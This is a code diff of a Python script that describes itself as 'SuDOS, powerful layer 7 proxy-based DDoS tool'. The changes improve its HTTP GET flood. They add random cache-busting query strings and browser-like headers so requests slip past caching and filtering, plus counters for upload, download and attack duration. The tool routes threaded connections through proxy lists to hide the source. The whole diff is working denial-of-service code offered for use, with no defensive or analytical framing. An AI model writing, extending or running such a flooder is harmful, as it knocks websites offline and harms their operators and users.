@@ -9,16 +9,28 @@ import socks
 import time
 import ssl
 import sys
+import os
 
+start_time = 0
 active_connections = 0
 connection_limit = 0
 active_threads = 0
 max_threads = 100
 delay = 1
 
+ups = 0
+total_ups = 0
+dps = 0
+total_dps = 0
 hrs = 0
 total_hrs = 0
 total_connected = 0
+
+RED = "\u001b[31;1m"
+GREEN = "\u001b[32;1m"
+YELLOW = "\u001b[33;1m"
+BLUE = "\u001b[34;1m"
+RESET = "\u001b[0;0m"
 
 user_agents = [
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.152 Safari/537.36",
@@ -40,6 +52,10 @@ def sudos(url, **kwargs):
         global hrs
         global total_hrs
         global total_connected
+        global dps
+        global total_dps
+        global ups
+        global total_ups
         active_threads += 1
         connected = False
         proxy_type = kwargs.get("proxy_type")
@@ -78,14 +94,28 @@ def sudos(url, **kwargs):
         if protocol == "https":
             context = ssl.create_default_context()
             sock = context.wrap_socket(sock, server_hostname=host)
+        if parameters:
+            parameters = f"&{parameters}"
+        else:
+            parameters = ""
         while True:
             if active_connections < connection_limit:
                 continue
+            anti_cache = rand_chars(77)
             user_agent = random.choice(user_agents)
-            http = f"GET {path}?{parameters} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {user_agent}\r\n\r\n"
-            sock.send(http.encode())
+            http = f"GET {path}?{anti_cache}{parameters} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {user_agent}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.5\r\nCache-Control: max-age=0\r\nConnection: keep-alive\r\nDNT: 1\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"
+            up = sock.send(http.encode())
+            ups += up
+            total_ups += up
             hrs += 1
             total_hrs += 1
+            while True:
+                receive = sock.recv(1024)
+                download = len(receive)
+                dps += download
+                total_dps += download
+                if download < 1024:
+                    break
             time.sleep(delay)
     except Exception as e:
         #print(f"sudos error: {e}")
@@ -95,12 +125,34 @@ def sudos(url, **kwargs):
         if connected:
             active_connections -= 1
 
+def clear_console():
+    if sys.platform == "linux":
+        os.system("clear")
+    elif sys.platform == "win32":
+        os.system("cls")
+
+def rand_chars(length):
+    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+    chars_list = list(chars)
+    rand_text = random.choices(chars_list, k=length)
+    text = "".join(rand_text)
+    return text
+
+def separate(separator_length, string):
+    separator = " " * separator_length
+    string = str(string)
+    return separator[len(string):]
+
 def verbose():
     try:
         global hrs
+        global dps
+        global ups
         while True:
-            print(f"Threads: {active_threads} Connections: {active_connections} HR/s: {hrs}")
+            print(f"Threads: {GREEN}{active_threads}{RESET} {separate(5, active_threads)} Connections: {GREEN}{active_connections}{RESET} {separate(5, active_connections)} HR/s: {GREEN}{hrs}{RESET} {separate(5, hrs)} D/s: {GREEN}{dps}{RESET} {separate(12, dps)} U/s {GREEN}{ups}{RESET}")
             hrs = 0
+            dps = 0
+            ups = 0
             time.sleep(1)
     except Exception:
         pass
@@ -139,14 +191,35 @@ def url_split(url):
     except Exception:
         return
 
+def bytecount(bytesize):
+    total = f"{bytesize} B"
+    if bytesize >= 1000:
+        total = bytesize / 1000
+        total = f"{total:.2f} kB"
+    if bytesize >= 1000000:
+        total = bytesize / 1000000
+        total = f"{total:.2f} MB"
+    if bytesize >= 1000000000:
+        total = bytesize / 1000000000
+        total = f"{total:.2f} GB"
+    if bytesize >= 1000000000000:
+        total = bytesize / 1000000000000
+        total = f"{total:.2f} TB"
+    return total
+
 def onexit():
-    print(f"\r\nTotal Requests: {total_hrs}\r\nTotal Connected: {total_connected}")
+    attack_duration = time.time() - start_time
+    attack_duration = f"{attack_duration:.2f}"
+    total_download = bytecount(total_dps)
+    total_upload = bytecount(total_ups)
+    print(f"\r\nTotal Requests: {total_hrs}\r\nTotal Connected: {total_connected}\r\nTotal Download: {total_download}\r\nTotal Upload: {total_upload}\r\n\r\nAttack Duration: {attack_duration} seconds")
 
 def main():
     try:
         global max_threads
         global delay
         global connection_limit
+        global start_time
         parser = argparse.ArgumentParser(description="SuDOS, powerful layer 7 proxy-based DDoS tool.")
         parser.add_argument("-t", "--threads", type=int, default=100, metavar="INT", help="Max thread count")
         parser.add_argument("-z", "--proxy-type", choices=["http", "socks4", "socks5"], metavar="PROXYTYPE", help="Proxy list type")
@@ -195,6 +268,8 @@ def main():
             proxy_type = getattr(socks, proxy_type)
         atexit.register(onexit)
         threading.Thread(target=verbose, daemon=True).start()
+        start_time = time.time()
+        clear_console()
         if proxy_list:
             while True:
                 for proxy in proxies:
